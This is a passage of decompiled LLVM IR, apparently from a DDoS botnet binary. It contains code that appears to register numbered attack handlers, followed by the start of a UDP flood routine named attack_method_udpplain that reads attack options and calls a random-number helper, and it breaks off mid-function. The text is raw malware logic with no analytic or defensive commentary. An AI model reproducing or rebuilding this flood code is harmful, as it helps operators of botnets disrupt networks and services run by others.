  store i32 %v5_86a8, i32* %r2.global-to-local, align 4
  %v0_86b4 = load i32, i32* @r5, align 4
  %v5_86b4 = mul nuw nsw i32 %v3_86ac, 4
  %v6_86b4 = add i32 %v5_86b4, %v5_86a8
  %v7_86b4 = inttoptr i32 %v6_86b4 to i32*
  store i32 %v0_86b4, i32* %v7_86b4, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_86bc = load i32, i32* %r3.global-to-local, align 4
  %v1_86bc = load i32, i32* @r8, align 4
  %v2_86bc = add i32 %v1_86bc, %v0_86bc
  store i32 %v2_86bc, i32* %r3.global-to-local, align 4
  %v1_86c4 = trunc i32 %v2_86bc to i8
  %v2_86c4 = load i32, i32* @r4, align 4
  %v3_86c4 = inttoptr i32 %v2_86c4 to i8*
  store i8 %v1_86c4, i8* %v3_86c4, align 1
  %v0_86c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_86c8 = load i32, i32* @r6, align 4
  %v2_86c8 = inttoptr i32 %v1_86c8 to i32*
  store i32 %v0_86c8, i32* %v2_86c8, align 4
  %v2_86cc = call i32 @calloc(i32 %v1_86bc, i32 8)
  %v2_86d0 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_86d0 = zext i8 %v2_86d0 to i32
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_86cc, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_86e0 = load i32, i32* @r8, align 4
  %v2_86e0 = add i32 %v1_86e0, %v3_86d0
  store i32 %v2_86e0, i32* %r1.global-to-local, align 4
  %v2_86e4 = load i32, i32* @global_var_218b8.31, align 4
  %v2_86e8 = inttoptr i32 %v2_86cc to i32*
  store i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32* %v2_86e8, align 4
  %v3_86ec = load i32, i32* @r5, align 4
  %v4_86ec = add i32 %v3_86ec, 4
  %v5_86ec = inttoptr i32 %v4_86ec to i8*
  store i8 2, i8* %v5_86ec, align 1
  %v0_86f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_86f0 = mul i32 %v0_86f0, 4
  store i32 %v3_86f0, i32* %r1.global-to-local, align 4
  %v5_86f4 = inttoptr i32 %v2_86e4 to i32*
  %v6_86f4 = call i32 @realloc(i32* %v5_86f4, i32 %v3_86f0, i32 ptrtoint (i32* @global_var_a4c0.41 to i32), i32 2)
  %v2_86f8 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_86f8 = zext i8 %v2_86f8 to i32
  store i32 %v3_86f8, i32* %r3.global-to-local, align 4
  store i32 %v6_86f4, i32* %r2.global-to-local, align 4
  %v0_8700 = load i32, i32* @r5, align 4
  %v5_8700 = mul nuw nsw i32 %v3_86f8, 4
  %v6_8700 = add i32 %v5_8700, %v6_86f4
  %v7_8700 = inttoptr i32 %v6_8700 to i32*
  store i32 %v0_8700, i32* %v7_8700, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_8708 = load i32, i32* %r3.global-to-local, align 4
  %v1_8708 = load i32, i32* @r8, align 4
  %v2_8708 = add i32 %v1_8708, %v0_8708
  store i32 %v2_8708, i32* %r3.global-to-local, align 4
  %v1_8710 = load i32, i32* @r6, align 4
  %v2_8710 = inttoptr i32 %v1_8710 to i32*
  store i32 %v6_86f4, i32* %v2_8710, align 4
  %v0_8714 = load i32, i32* %r3.global-to-local, align 4
  %v1_8714 = trunc i32 %v0_8714 to i8
  %v2_8714 = load i32, i32* @r4, align 4
  %v3_8714 = inttoptr i32 %v2_8714 to i8*
  store i8 %v1_8714, i8* %v3_8714, align 1
  %v2_8718 = call i32 @calloc(i32 %v1_8708, i32 8)
  %v2_871c = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_871c = zext i8 %v2_871c to i32
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %r3.global-to-local, align 4
  store i32 8, i32* @r7, align 4
  store i32 %v2_8718, i32* @r5, align 4
  %v1_872c = load i32, i32* @r8, align 4
  %v2_872c = add i32 %v1_872c, %v3_871c
  store i32 %v2_872c, i32* %r1.global-to-local, align 4
  %v2_8730 = load i32, i32* @global_var_218b8.31, align 4
  %v2_8734 = inttoptr i32 %v2_8718 to i32*
  store i32 ptrtoint (i32* @global_var_89ac.43 to i32), i32* %v2_8734, align 4
  %v0_8738 = load i32, i32* @r7, align 4
  %v1_8738 = trunc i32 %v0_8738 to i8
  %v2_8738 = load i32, i32* @r5, align 4
  %v3_8738 = add i32 %v2_8738, 4
  %v4_8738 = inttoptr i32 %v3_8738 to i8*
  store i8 %v1_8738, i8* %v4_8738, align 1
  %v0_873c = load i32, i32* %r1.global-to-local, align 4
  %v3_873c = mul i32 %v0_873c, 4
  store i32 %v3_873c, i32* %r1.global-to-local, align 4
  %v4_8740 = inttoptr i32 %v2_8730 to i32*
  %v5_8740 = call i32 @realloc(i32* %v4_8740, i32 %v3_873c, i32 %v6_86f4, i32 ptrtoint (i32* @global_var_89ac.43 to i32))
  %v2_8744 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8744 = zext i8 %v2_8744 to i32
  store i32 %v3_8744, i32* %r3.global-to-local, align 4
  store i32 %v5_8740, i32* %r2.global-to-local, align 4
  %v0_874c = load i32, i32* @r5, align 4
  %v5_874c = mul nuw nsw i32 %v3_8744, 4
  %v6_874c = add i32 %v5_874c, %v5_8740
  %v7_874c = inttoptr i32 %v6_874c to i32*
  store i32 %v0_874c, i32* %v7_874c, align 4
  %v0_8750 = load i32, i32* @r7, align 4
  store i32 %v0_8750, i32* %r1.global-to-local, align 4
  %v0_8754 = load i32, i32* %r3.global-to-local, align 4
  %v1_8754 = load i32, i32* @r8, align 4
  %v2_8754 = add i32 %v1_8754, %v0_8754
  store i32 %v2_8754, i32* %r3.global-to-local, align 4
  %v1_875c = trunc i32 %v2_8754 to i8
  %v2_875c = load i32, i32* @r4, align 4
  %v3_875c = inttoptr i32 %v2_875c to i8*
  store i8 %v1_875c, i8* %v3_875c, align 1
  %v0_8760 = load i32, i32* %r2.global-to-local, align 4
  %v1_8760 = load i32, i32* @r6, align 4
  %v2_8760 = inttoptr i32 %v1_8760 to i32*
  store i32 %v0_8760, i32* %v2_8760, align 4
  %v2_8764 = call i32 @calloc(i32 %v1_8754, i32 %v0_8750)
  %v2_8768 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8768 = zext i8 %v2_8768 to i32
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8764, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_8778 = load i32, i32* @r8, align 4
  %v2_8778 = add i32 %v1_8778, %v3_8768
  store i32 %v2_8778, i32* %r1.global-to-local, align 4
  %v2_877c = load i32, i32* @global_var_218b8.31, align 4
  %v2_8780 = inttoptr i32 %v2_8764 to i32*
  store i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32* %v2_8780, align 4
  %v3_8784 = load i32, i32* @r5, align 4
  %v4_8784 = add i32 %v3_8784, 4
  %v5_8784 = inttoptr i32 %v4_8784 to i8*
  store i8 3, i8* %v5_8784, align 1
  %v0_8788 = load i32, i32* %r1.global-to-local, align 4
  %v3_8788 = mul i32 %v0_8788, 4
  store i32 %v3_8788, i32* %r1.global-to-local, align 4
  %v5_878c = inttoptr i32 %v2_877c to i32*
  %v6_878c = call i32 @realloc(i32* %v5_878c, i32 %v3_8788, i32 ptrtoint (i32* @global_var_c1dc.45 to i32), i32 3)
  %v2_8790 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8790 = zext i8 %v2_8790 to i32
  store i32 %v3_8790, i32* %r3.global-to-local, align 4
  store i32 %v6_878c, i32* %r2.global-to-local, align 4
  %v0_8798 = load i32, i32* @r5, align 4
  %v5_8798 = mul nuw nsw i32 %v3_8790, 4
  %v6_8798 = add i32 %v5_8798, %v6_878c
  %v7_8798 = inttoptr i32 %v6_8798 to i32*
  store i32 %v0_8798, i32* %v7_8798, align 4
  %v0_879c = load i32, i32* @r7, align 4
  store i32 %v0_879c, i32* %r1.global-to-local, align 4
  %v0_87a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_87a0 = load i32, i32* @r8, align 4
  %v2_87a0 = add i32 %v1_87a0, %v0_87a0
  store i32 %v2_87a0, i32* %r3.global-to-local, align 4
  %v1_87a8 = trunc i32 %v2_87a0 to i8
  %v2_87a8 = load i32, i32* @r4, align 4
  %v3_87a8 = inttoptr i32 %v2_87a8 to i8*
  store i8 %v1_87a8, i8* %v3_87a8, align 1
  %v0_87ac = load i32, i32* %r2.global-to-local, align 4
  %v1_87ac = load i32, i32* @r6, align 4
  %v2_87ac = inttoptr i32 %v1_87ac to i32*
  store i32 %v0_87ac, i32* %v2_87ac, align 4
  %v2_87b0 = call i32 @calloc(i32 %v1_87a0, i32 %v0_879c)
  %v2_87b4 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_87b4 = zext i8 %v2_87b4 to i32
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87b0, i32* @r5, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v1_87c4 = load i32, i32* @r8, align 4
  %v2_87c4 = add i32 %v1_87c4, %v3_87b4
  store i32 %v2_87c4, i32* %r1.global-to-local, align 4
  %v2_87c8 = load i32, i32* @global_var_218b8.31, align 4
  %v2_87cc = inttoptr i32 %v2_87b0 to i32*
  store i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32* %v2_87cc, align 4
  %v3_87d0 = load i32, i32* @r5, align 4
  %v4_87d0 = add i32 %v3_87d0, 4
  %v5_87d0 = inttoptr i32 %v4_87d0 to i8*
  store i8 4, i8* %v5_87d0, align 1
  %v0_87d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_87d4 = mul i32 %v0_87d4, 4
  store i32 %v3_87d4, i32* %r1.global-to-local, align 4
  %v5_87d8 = inttoptr i32 %v2_87c8 to i32*
  %v6_87d8 = call i32 @realloc(i32* %v5_87d8, i32 %v3_87d4, i32 ptrtoint (i32* @global_var_bae4.47 to i32), i32 4)
  %v2_87dc = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_87dc = zext i8 %v2_87dc to i32
  store i32 %v3_87dc, i32* %r3.global-to-local, align 4
  store i32 %v6_87d8, i32* %r2.global-to-local, align 4
  %v0_87e4 = load i32, i32* @r5, align 4
  %v5_87e4 = mul nuw nsw i32 %v3_87dc, 4
  %v6_87e4 = add i32 %v5_87e4, %v6_87d8
  %v7_87e4 = inttoptr i32 %v6_87e4 to i32*
  store i32 %v0_87e4, i32* %v7_87e4, align 4
  %v0_87e8 = load i32, i32* @r7, align 4
  store i32 %v0_87e8, i32* %r1.global-to-local, align 4
  %v0_87ec = load i32, i32* %r3.global-to-local, align 4
  %v1_87ec = load i32, i32* @r8, align 4
  %v2_87ec = add i32 %v1_87ec, %v0_87ec
  store i32 %v2_87ec, i32* %r3.global-to-local, align 4
  %v1_87f4 = trunc i32 %v2_87ec to i8
  %v2_87f4 = load i32, i32* @r4, align 4
  %v3_87f4 = inttoptr i32 %v2_87f4 to i8*
  store i8 %v1_87f4, i8* %v3_87f4, align 1
  %v0_87f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_87f8 = load i32, i32* @r6, align 4
  %v2_87f8 = inttoptr i32 %v1_87f8 to i32*
  store i32 %v0_87f8, i32* %v2_87f8, align 4
  %v2_87fc = call i32 @calloc(i32 %v1_87ec, i32 %v0_87e8)
  %v2_8800 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8800 = zext i8 %v2_8800 to i32
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_87fc, i32* @r5, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v1_8810 = load i32, i32* @r8, align 4
  %v2_8810 = add i32 %v1_8810, %v3_8800
  store i32 %v2_8810, i32* %r1.global-to-local, align 4
  %v2_8814 = load i32, i32* @global_var_218b8.31, align 4
  %v2_8818 = inttoptr i32 %v2_87fc to i32*
  store i32 ptrtoint (i32* @global_var_b330.49 to i32), i32* %v2_8818, align 4
  %v3_881c = load i32, i32* @r5, align 4
  %v4_881c = add i32 %v3_881c, 4
  %v5_881c = inttoptr i32 %v4_881c to i8*
  store i8 5, i8* %v5_881c, align 1
  %v0_8820 = load i32, i32* %r1.global-to-local, align 4
  %v3_8820 = mul i32 %v0_8820, 4
  store i32 %v3_8820, i32* %r1.global-to-local, align 4
  %v5_8824 = inttoptr i32 %v2_8814 to i32*
  %v6_8824 = call i32 @realloc(i32* %v5_8824, i32 %v3_8820, i32 ptrtoint (i32* @global_var_b330.49 to i32), i32 5)
  %v2_8828 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8828 = zext i8 %v2_8828 to i32
  store i32 %v3_8828, i32* %r3.global-to-local, align 4
  store i32 %v6_8824, i32* %r2.global-to-local, align 4
  %v0_8830 = load i32, i32* @r5, align 4
  %v5_8830 = mul nuw nsw i32 %v3_8828, 4
  %v6_8830 = add i32 %v5_8830, %v6_8824
  %v7_8830 = inttoptr i32 %v6_8830 to i32*
  store i32 %v0_8830, i32* %v7_8830, align 4
  %v0_8834 = load i32, i32* @r7, align 4
  store i32 %v0_8834, i32* %r1.global-to-local, align 4
  %v0_8838 = load i32, i32* %r3.global-to-local, align 4
  %v1_8838 = load i32, i32* @r8, align 4
  %v2_8838 = add i32 %v1_8838, %v0_8838
  store i32 %v2_8838, i32* %r3.global-to-local, align 4
  %v1_8840 = trunc i32 %v2_8838 to i8
  %v2_8840 = load i32, i32* @r4, align 4
  %v3_8840 = inttoptr i32 %v2_8840 to i8*
  store i8 %v1_8840, i8* %v3_8840, align 1
  %v0_8844 = load i32, i32* %r2.global-to-local, align 4
  %v1_8844 = load i32, i32* @r6, align 4
  %v2_8844 = inttoptr i32 %v1_8844 to i32*
  store i32 %v0_8844, i32* %v2_8844, align 4
  %v2_8848 = call i32 @calloc(i32 %v1_8838, i32 %v0_8834)
  %v2_884c = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_884c = zext i8 %v2_884c to i32
  store i32 43900, i32* %r2.global-to-local, align 4
  store i32 %v2_8848, i32* @r5, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v1_885c = load i32, i32* @r8, align 4
  %v2_885c = add i32 %v1_885c, %v3_884c
  store i32 %v2_885c, i32* %r1.global-to-local, align 4
  %v2_8860 = load i32, i32* @global_var_218b8.31, align 4
  %v2_8864 = inttoptr i32 %v2_8848 to i32*
  store i32 43900, i32* %v2_8864, align 4
  %v3_8868 = load i32, i32* @r5, align 4
  %v4_8868 = add i32 %v3_8868, 4
  %v5_8868 = inttoptr i32 %v4_8868 to i8*
  store i8 10, i8* %v5_8868, align 1
  %v0_886c = load i32, i32* %r1.global-to-local, align 4
  %v3_886c = mul i32 %v0_886c, 4
  store i32 %v3_886c, i32* %r1.global-to-local, align 4
  %v5_8870 = inttoptr i32 %v2_8860 to i32*
  %v6_8870 = call i32 @realloc(i32* %v5_8870, i32 %v3_886c, i32 43900, i32 10)
  %v2_8874 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8874 = zext i8 %v2_8874 to i32
  store i32 %v3_8874, i32* %r3.global-to-local, align 4
  store i32 %v6_8870, i32* %r2.global-to-local, align 4
  %v0_887c = load i32, i32* @r5, align 4
  %v5_887c = mul nuw nsw i32 %v3_8874, 4
  %v6_887c = add i32 %v5_887c, %v6_8870
  %v7_887c = inttoptr i32 %v6_887c to i32*
  store i32 %v0_887c, i32* %v7_887c, align 4
  %v0_8880 = load i32, i32* @r7, align 4
  store i32 %v0_8880, i32* %r1.global-to-local, align 4
  %v0_8884 = load i32, i32* %r3.global-to-local, align 4
  %v1_8884 = load i32, i32* @r8, align 4
  %v2_8884 = add i32 %v1_8884, %v0_8884
  store i32 %v2_8884, i32* %r3.global-to-local, align 4
  %v1_888c = trunc i32 %v2_8884 to i8
  %v2_888c = load i32, i32* @r4, align 4
  %v3_888c = inttoptr i32 %v2_888c to i8*
  store i8 %v1_888c, i8* %v3_888c, align 1
  %v0_8890 = load i32, i32* %r2.global-to-local, align 4
  %v1_8890 = load i32, i32* @r6, align 4
  %v2_8890 = inttoptr i32 %v1_8890 to i32*
  store i32 %v0_8890, i32* %v2_8890, align 4
  %v2_8894 = call i32 @calloc(i32 %v1_8884, i32 %v0_8880)
  %v2_8898 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8898 = zext i8 %v2_8898 to i32
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_8894, i32* @r5, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v1_88a8 = load i32, i32* @r8, align 4
  %v2_88a8 = add i32 %v1_88a8, %v3_8898
  store i32 %v2_88a8, i32* %r1.global-to-local, align 4
  %v2_88ac = load i32, i32* @global_var_218b8.31, align 4
  %v2_88b0 = inttoptr i32 %v2_8894 to i32*
  store i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32* %v2_88b0, align 4
  %v3_88b4 = load i32, i32* @r5, align 4
  %v4_88b4 = add i32 %v3_88b4, 4
  %v5_88b4 = inttoptr i32 %v4_88b4 to i8*
  store i8 6, i8* %v5_88b4, align 1
  %v0_88b8 = load i32, i32* %r1.global-to-local, align 4
  %v3_88b8 = mul i32 %v0_88b8, 4
  store i32 %v3_88b8, i32* %r1.global-to-local, align 4
  %v5_88bc = inttoptr i32 %v2_88ac to i32*
  %v6_88bc = call i32 @realloc(i32* %v5_88bc, i32 %v3_88b8, i32 ptrtoint (i32* @global_var_9a6c.52 to i32), i32 6)
  %v2_88c0 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_88c0 = zext i8 %v2_88c0 to i32
  store i32 %v3_88c0, i32* %r3.global-to-local, align 4
  store i32 %v6_88bc, i32* %r2.global-to-local, align 4
  %v0_88c8 = load i32, i32* @r5, align 4
  %v5_88c8 = mul nuw nsw i32 %v3_88c0, 4
  %v6_88c8 = add i32 %v5_88c8, %v6_88bc
  %v7_88c8 = inttoptr i32 %v6_88c8 to i32*
  store i32 %v0_88c8, i32* %v7_88c8, align 4
  %v0_88cc = load i32, i32* @r7, align 4
  store i32 %v0_88cc, i32* %r1.global-to-local, align 4
  %v0_88d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_88d0 = load i32, i32* @r8, align 4
  %v2_88d0 = add i32 %v1_88d0, %v0_88d0
  store i32 %v2_88d0, i32* %r3.global-to-local, align 4
  %v1_88d8 = trunc i32 %v2_88d0 to i8
  %v2_88d8 = load i32, i32* @r4, align 4
  %v3_88d8 = inttoptr i32 %v2_88d8 to i8*
  store i8 %v1_88d8, i8* %v3_88d8, align 1
  %v0_88dc = load i32, i32* %r2.global-to-local, align 4
  %v1_88dc = load i32, i32* @r6, align 4
  %v2_88dc = inttoptr i32 %v1_88dc to i32*
  store i32 %v0_88dc, i32* %v2_88dc, align 4
  %v2_88e0 = call i32 @calloc(i32 %v1_88d0, i32 %v0_88cc)
  %v2_88e4 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_88e4 = zext i8 %v2_88e4 to i32
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_88e0, i32* @r5, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v1_88f4 = load i32, i32* @r8, align 4
  %v2_88f4 = add i32 %v1_88f4, %v3_88e4
  store i32 %v2_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = load i32, i32* @global_var_218b8.31, align 4
  %v2_88fc = inttoptr i32 %v2_88e0 to i32*
  store i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32* %v2_88fc, align 4
  %v3_8900 = load i32, i32* @r5, align 4
  %v4_8900 = add i32 %v3_8900, 4
  %v5_8900 = inttoptr i32 %v4_8900 to i8*
  store i8 7, i8* %v5_8900, align 1
  %v0_8904 = load i32, i32* %r1.global-to-local, align 4
  %v3_8904 = mul i32 %v0_8904, 4
  store i32 %v3_8904, i32* %r1.global-to-local, align 4
  %v5_8908 = inttoptr i32 %v2_88f8 to i32*
  %v6_8908 = call i32 @realloc(i32* %v5_8908, i32 %v3_8904, i32 ptrtoint (i32* @global_var_93d8.54 to i32), i32 7)
  %v2_890c = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_890c = zext i8 %v2_890c to i32
  store i32 %v3_890c, i32* %r3.global-to-local, align 4
  store i32 %v6_8908, i32* %r2.global-to-local, align 4
  %v0_8914 = load i32, i32* @r5, align 4
  %v5_8914 = mul nuw nsw i32 %v3_890c, 4
  %v6_8914 = add i32 %v5_8914, %v6_8908
  %v7_8914 = inttoptr i32 %v6_8914 to i32*
  store i32 %v0_8914, i32* %v7_8914, align 4
  %v0_8918 = load i32, i32* @r7, align 4
  store i32 %v0_8918, i32* %r1.global-to-local, align 4
  %v0_891c = load i32, i32* %r3.global-to-local, align 4
  %v1_891c = load i32, i32* @r8, align 4
  %v2_891c = add i32 %v1_891c, %v0_891c
  store i32 %v2_891c, i32* %r3.global-to-local, align 4
  %v1_8924 = trunc i32 %v2_891c to i8
  %v2_8924 = load i32, i32* @r4, align 4
  %v3_8924 = inttoptr i32 %v2_8924 to i8*
  store i8 %v1_8924, i8* %v3_8924, align 1
  %v0_8928 = load i32, i32* %r2.global-to-local, align 4
  %v1_8928 = load i32, i32* @r6, align 4
  %v2_8928 = inttoptr i32 %v1_8928 to i32*
  store i32 %v0_8928, i32* %v2_8928, align 4
  %v2_892c = call i32 @calloc(i32 %v1_891c, i32 %v0_8918)
  %v2_8930 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8930 = zext i8 %v2_8930 to i32
  store i32 35916, i32* %r2.global-to-local, align 4
  store i32 %v2_892c, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v1_8940 = load i32, i32* @r8, align 4
  %v2_8940 = add i32 %v1_8940, %v3_8930
  store i32 %v2_8940, i32* %r1.global-to-local, align 4
  %v2_8944 = load i32, i32* @global_var_218b8.31, align 4
  %v2_8948 = inttoptr i32 %v2_892c to i32*
  store i32 35916, i32* %v2_8948, align 4
  %v3_894c = load i32, i32* @r5, align 4
  %v4_894c = add i32 %v3_894c, 4
  %v5_894c = inttoptr i32 %v4_894c to i8*
  store i8 9, i8* %v5_894c, align 1
  %v0_8950 = load i32, i32* %r1.global-to-local, align 4
  %v3_8950 = mul i32 %v0_8950, 4
  store i32 %v3_8950, i32* %r1.global-to-local, align 4
  %v5_8954 = inttoptr i32 %v2_8944 to i32*
  %v6_8954 = call i32 @realloc(i32* %v5_8954, i32 %v3_8950, i32 35916, i32 9)
  %v2_8958 = load i8, i8* bitcast (i8** @global_var_218b4.29 to i8*), align 4
  %v3_8958 = zext i8 %v2_8958 to i32
  store i32 %v3_8958, i32* %r3.global-to-local, align 4
  %v1_895c = load i32, i32* @r6, align 4
  %v2_895c = inttoptr i32 %v1_895c to i32*
  store i32 %v6_8954, i32* %v2_895c, align 4
  %v0_8960 = load i32, i32* @r5, align 4
  %v2_8960 = load i32, i32* %r3.global-to-local, align 4
  %v5_8960 = mul i32 %v2_8960, 4
  %v6_8960 = add i32 %v5_8960, %v6_8954
  %v7_8960 = inttoptr i32 %v6_8960 to i32*
  store i32 %v0_8960, i32* %v7_8960, align 4
  %v0_8964 = load i32, i32* %r3.global-to-local, align 4
  %v1_8964 = load i32, i32* @r8, align 4
  %v2_8964 = add i32 %v1_8964, %v0_8964
  store i32 %v2_8964, i32* %r2.global-to-local, align 4
  %v1_896c = trunc i32 %v2_8964 to i8
  %v2_896c = load i32, i32* @r4, align 4
  %v3_896c = inttoptr i32 %v2_896c to i8*
  store i8 %v1_896c, i8* %v3_896c, align 1
  %v2_8970 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_8970, i32* @r4, align 4
  store i32 %v6_8620, i32* @r5, align 4
  store i32 %v9_8620, i32* @r6, align 4
  store i32 %v12_8620, i32* @r7, align 4
  store i32 %v15_8620, i32* @r8, align 4
  ret i32 %v1_8964

; uselistorder directives
  uselistorder i32 %v1_8964, { 1, 0 }
  uselistorder i32 %v3_8950, { 1, 0 }
  uselistorder i32 %v1_891c, { 1, 0 }
  uselistorder i32 %v3_8904, { 1, 0 }
  uselistorder i32 %v1_88d0, { 1, 0 }
  uselistorder i32 %v3_88b8, { 1, 0 }
  uselistorder i32 %v1_8884, { 1, 0 }
  uselistorder i32 %v3_886c, { 1, 0 }
  uselistorder i32 %v1_8838, { 1, 0 }
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %v1_87ec, { 1, 0 }
  uselistorder i32 %v3_87d4, { 1, 0 }
  uselistorder i32 %v1_87a0, { 1, 0 }
  uselistorder i32 %v3_8788, { 1, 0 }
  uselistorder i32 %v1_8754, { 1, 0 }
  uselistorder i32 %v3_873c, { 1, 0 }
  uselistorder i32 %v1_8708, { 1, 0 }
  uselistorder i32 %v6_86f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_86f0, { 1, 0 }
  uselistorder i32 %v1_86bc, { 1, 0 }
  uselistorder i32 %v3_86a4, { 1, 0 }
  uselistorder i32 %v2_8680, { 1, 0 }
  uselistorder i32 %v6_865c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8658, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 0 }
  uselistorder i8* bitcast (i8** @global_var_218b4.29 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_218b5.37 to i32), { 2, 1, 0 }
  uselistorder i8** @global_var_218b4.29, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_218b4.29 to i32), { 1, 0 }
}

define i32 @attack_method_udpplain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i16, align 2
  %v18_89ac = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_89c8 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_89c8, i32* @sl, align 4
  %v0_89d4 = load i32, i32* @r7, align 4
  %v2_89d8 = call i32 @calloc(i32 %v0_89d4, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_89e4 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_89d8, i32* @r8, align 4
  %v0_89f4 = load i32, i32* @r5, align 4
  %v4_89f8 = inttoptr i32 %v0_89e4 to i32*
  %v5_89f8 = call i32 @attack_get_opt_int(i32 %v0_89f4, i32* %v4_89f8, i32 7, i32 65535)
  %v3_8a00 = urem i32 %v5_89f8, 65536
  %v0_8a04 = load i32, i32* @r6, align 4
  %v0_8a0c = load i32, i32* @r4, align 4
  store i32 %v0_8a0c, i32* %r3.global-to-local, align 4
  %v0_8a10 = load i32, i32* @r5, align 4
  %v5_8a18 = inttoptr i32 %v0_8a04 to i32*
  %v6_8a18 = call i32 @attack_get_opt_int(i32 %v0_8a10, i32* %v5_8a18, i32 6, i32 %v0_8a0c)
  %v0_8a1c = load i32, i32* @r6, align 4
  %v3_8a20 = mul i32 %v6_8a18, 65536
  store i32 %v3_8a20, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_8a2c = load i32, i32* @r5, align 4
  %v4_8a30 = inttoptr i32 %v0_8a1c to i32*
  %v5_8a30 = call i32 @attack_get_opt_int(i32 %v0_8a2c, i32* %v4_8a30, i32 0, i32 512)
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8a40 = load i32, i32* @r6, align 4
  %v0_8a44 = load i32, i32* @r5, align 4
  %v3_8a48 = urem i32 %v5_8a30, 65536
  store i32 %v3_8a48, i32* @r5, align 4
  %v4_8a4c = inttoptr i32 %v0_8a40 to i32*
  %v5_8a4c = call i32 @attack_get_opt_int(i32 %v0_8a44, i32* %v4_8a4c, i32 1, i32 1)
  %v0_8a50 = load i32, i32* %sb.global-to-local, align 4
  %v3_8a50 = udiv i32 %v0_8a50, 65536
  store i32 %v3_8a50, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_8a58 = load i32, i32* @r4, align 4
  %v9_8a58 = icmp eq i32 %v3_8a50, %v1_8a58
  br i1 %v9_8a58, label %dec_label_pc_8a88, label %bb

bb:                                               ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v4_8a70 = udiv i32 %v0_8a50, 16777216
  store i32 %v4_8a70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_8a98

dec_label_pc_8a88:                                ; preds = %entry
  store i16 0, i16* %stack_var_-56, align 2
  %v0_8a88 = call i32 @rand_next()
